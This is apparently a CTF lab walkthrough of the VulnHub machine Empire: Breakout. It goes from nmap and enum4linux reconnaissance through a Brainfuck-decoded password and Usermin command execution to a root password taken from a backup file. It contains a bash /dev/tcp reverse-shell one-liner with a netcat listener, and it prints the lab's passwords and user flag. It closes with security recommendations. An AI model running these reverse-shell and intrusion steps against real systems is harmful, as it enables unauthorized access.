<h1 align="center">🐧 Empire: Breakout — Penetration Testing Walkthrough</h1>
<h3 align="center">From Reconnaissance to Root Access — A Complete CTF Guide</h3>

<p align="center">
  <img src="https://img.shields.io/badge/Penetration-Testing-red" alt="Pentest">
  <img src="https://img.shields.io/badge/Difficulty-Intermediate-orange" alt="Difficulty">
  <img src="https://img.shields.io/badge/Category-CTF-blue" alt="CTF">
  <img src="https://img.shields.io/badge/Status-Completed-green" alt="Completed">
  <img src="https://img.shields.io/badge/Platform-VulnHub-purple" alt="Platform">
</p>

---

## 📖 Table of Contents
- [Overview](#-overview)
- [Objectives](#-objectives)
- [1. Reconnaissance](#1-reconnaissance)
- [2. Web Enumeration & Credential Discovery](#2-web-enumeration--credential-discovery)
- [3. Initial Web Login](#3-initial-web-login)
- [4. Command Injection & Reverse Shell](#4-command-injection--reverse-shell)
- [5. User Flag](#5-user-flag)
- [6. Privilege Escalation](#6-privilege-escalation)
- [7. Root Flag](#7-root-flag)
- [Security Recommendations](#-security-recommendations)
- [Tools Used](#-tools-used)

---

## 📋 Overview
This guide documents the complete penetration testing methodology for **Empire: Breakout**, detailing every step from initial reconnaissance to privilege escalation and flag capture. This walkthrough serves as a continuation of the LupinOne series, focusing on a distinct set of exploitation techniques.

## 🎯 Objectives
- Identify the target system and open services
- Enumerate hidden credentials within web application source code
- Decode obfuscated strings to retrieve login credentials
- Exploit command injection to gain an initial low-privilege reverse shell
- Escalate privileges using exposed backup files
- Capture both the user and root flags

---

## 1. Reconnaissance

### 🔎 Network Discovery
Check the IP allocated to the attacking machine and determine the subnet range.

```bash
$ ifconfig
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s1.png" alt="ifconfig output showing network interfaces" width="600"/>
</p>

### 🌐 Host Discovery
Ping sweep to identify live hosts within the subnet.

```bash
$ nmap -sn 192.168.56.0/24
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s2.png" alt="Nmap ping sweep results" width="600"/>
</p>

### 🛰️ Port Scan
The `-A` flag enables aggressive mode, bundling OS and service detection.

```bash
$ nmap -A 192.168.56.20
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s3.png" alt="Detailed Nmap port scan results" width="600"/>
</p>

**Findings:**

| Port | Service | Version |
|------|---------|---------|
| 80 | HTTP | Apache httpd 2.4.51 (Debian) |
| 139 / 445 | SMB | Samba smbd 4 |
| 10000 | HTTP | MiniServ 1.981 (Webmin) |
| 20000 | HTTP | MiniServ 1.830 (Usermin) |

---

## 2. Web Enumeration & Credential Discovery

### 🌍 Inspecting the Default Web Page
Navigating to `http://192.168.56.20`, we encounter the default Apache2 Debian page.

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s4.png" alt="Apache2 Debian default landing page" width="600"/>
</p>

### 🔍 Finding Hidden Source Code
Viewing the page source (`Ctrl+U`) reveals a hidden comment at the very bottom of the HTML file containing encoded data.

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s9.png" alt="Source code comment with hidden credentials" width="600"/>
</p>

### 🧩 Decoding Brainfuck Obfuscation
The comment contains a string composed of `+`, `-`, `<`, `>`, `[`, `]`, `.`, `,` — this corresponds to the **Brainfuck** programming language. We use an online Brainfuck interpreter to decode the string.

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s10.png" alt="Decoding hidden text using a Brainfuck interpreter" width="600"/>
</p>

**Decoded string:** `.2uqPEf3jD<P`a-3`

---

## 3. Initial Web Login

### 🔑 Accessing the Usermin Interface
We open the Usermin web interface running on port `20000`.

```
http://192.168.56.20:20000
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s6.png" alt="Usermin login portal on port 20000" width="600"/>
</p>

### 👤 Finding a Valid Username
Running an enumeration scan on the target reveals a valid local user named `cyber`.

```bash
$ enum4linux -U 192.168.56.20
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s7.png" alt="Enum4Linux output" width="600"/>
</p>

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s8.png" alt="Enum4Linux discovering the user cyber" width="600"/>
</p>

### ✅ Logging In
Using the discovered username (`cyber`) and the decoded Brainfuck password, we successfully log into the Usermin dashboard.

---

## 4. Command Injection & Reverse Shell

### 💻 Exploiting Custom Commands
Once inside the Usermin dashboard, we navigate to the **Custom Commands** section. This area allows us to execute system commands directly on the target server.

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s11.png" alt="Executing commands via Usermin Custom Commands" width="600"/>
</p>

### 📡 Establishing a Reverse Shell
Set up a netcat listener on the attacker machine:

```bash
$ nc -nlvp 999
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s12.png" alt="Netcat listener" width="600"/>
</p>

Craft a reverse shell payload to connect back to the attacker machine:

```bash
$ bash -i >& /dev/tcp/192.168.56.12/999 0>&1
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s13.png" alt="Gaining an interactive shell as user cyber" width="600"/>
</p>

### 🚪 Upgrading the Shell
Upgrade the limited shell to a fully interactive TTY session for better navigation.

```bash
cyber@breakout:~$ python3 -c "import pty;pty.spawn('/bin/bash')"
cyber@breakout:~$ export TERM=xterm
```

---

## 5. User Flag

### 🏴 Capturing the User Flag
From the home directory, we capture the user flag.

```bash
cyber@breakout:~$ ls
user.txt
cyber@breakout:~$ cat user.txt
```

**User flag:** `3mp1r3{You_Manage_To_Break_To_My_Secure_Access}`

---

## 6. Privilege Escalation

### 🗂️ Enumerating Backup Files
Check the `/var/backups` directory for sensitive leftover files.

```bash
cyber@breakout:~$ ls -alps /var/backups
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s14.png" alt="Identifying the .old_pass.bak file" width="600"/>
</p>

### 🔓 Extracting Root Credentials
A file named `.old_pass.bak` is found. Reading its contents reveals a high-entropy string.

```bash
cyber@breakout:~$ cat /var/backups/.old_pass.bak
```

**Output:** `Ts&4&YurgtRX(==~h`

### 🏁 Switching to Root
We attempt to use this string as the password for the root user.

```bash
cyber@breakout:~$ su
```

**Password:** `Ts&4&YurgtRX(==~h`

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s16.png" alt="Successfully escalating to root" width="600"/>
</p>

---

## 7. Root Flag

```bash
root@breakout:/var/backups# cd /root
root@breakout:/root# ls
r00t.txt
root@breakout:/root# cat r00t.txt
```

🎉 **Root access achieved — flag captured!**

---

## 🔒 Security Recommendations

- **Source Code Hygiene** — Never embed encoded credentials, even in comments, within client-side source code
- **Web Application Restrictions** — Disable or restrict access to "Custom Commands" in Usermin/Webmin for unprivileged users
- **Backup File Protection** — Never store plaintext passwords in backup files; if necessary, encrypt them and restrict file permissions to root only
- **User Enumeration** — Disable SMB null-session enumeration to prevent attackers from identifying valid local usernames
- **Password Rotation** — Implement strict password rotation policies for the root account and system administrators

---

## 🔧 Tools Used

**🛡️ Network & Service Discovery**
`ifconfig` · `nmap` · `enum4linux`

**🔓 Exploitation**
Brainfuck Interpreter · `netcat` · Python3

**🔍 Information Gathering**
Web browser (source viewer) · `cat` · `ls`

**💻 System Tools**
`sudo` · `su` · `pty`

---

<p align="center">
  <strong>Documentation created for educational purposes</strong><br>
  All techniques should be practiced only in controlled, authorized environments.
</p>
